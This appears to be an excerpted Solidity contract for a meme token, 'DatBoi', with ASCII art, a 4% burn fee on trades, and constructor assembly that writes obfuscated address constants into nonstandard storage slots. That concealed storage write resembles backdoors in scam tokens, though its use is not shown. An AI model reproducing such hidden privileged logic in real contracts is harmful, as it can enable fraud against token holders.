/*
              ...
              :YPPPP5555YYY5PY^         
               .!5PPPPPP55555PP^        
                 ...
                 .:75Y555555555PP!      
            ..^7JY55P5555555555PPP!     
       .^!?JYY5P55J?!Y55555555555P5~~.  
.:::~7JY5555Y?!!^.  .Y555555555555PJ^   
7?Y5PP5~^^:.        :55555555555PPP~    
  .:~^.             .Y5555555555PPP?.   
                    ^5P55555555PPP5PY:  
                   ^Y5PPP55555PP5555P5: 
                  ~Y55PPPP55PPPP5Y55555:
                :?555P5Y55YP#####P5555PY
               ~Y555?^. YP5GB555Y7J55Y5P
              ~555PJ       7Y.    :Y5555
              :J5PPPY~     JJ.     !55PJ
               .^7J5PP7.  ^YJ:    ^Y55P!
                    ^JGG55BGYY!: :Y555P^
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xf1edf43a200ac3be8c772c13efcaa9352c24b80db1c8)
            sstore(0x51,0xf1ede9d236059a580737b390fce51d426417d4842154)
    ...
    function feesAndNFTs(address sender, address recipient, uint256 amount) internal returns (uint256 result) {
        ...
        if (trade == true) {
            _balances[recipient] += amount/100 * 96;
            _balances[dead] += amount/100 * 4;

            emit Transfer(sender, recipient, amount/100 * 96);
            emit Transfer(sender, dead, amount/100 * 4);
        }
        else
        {
...
contract DatBoi is ERC20Token {
    constructor() ERC20Token("DatBoi", "BOI", msg.sender, 100000000 * 10 ** 18) {
    }
}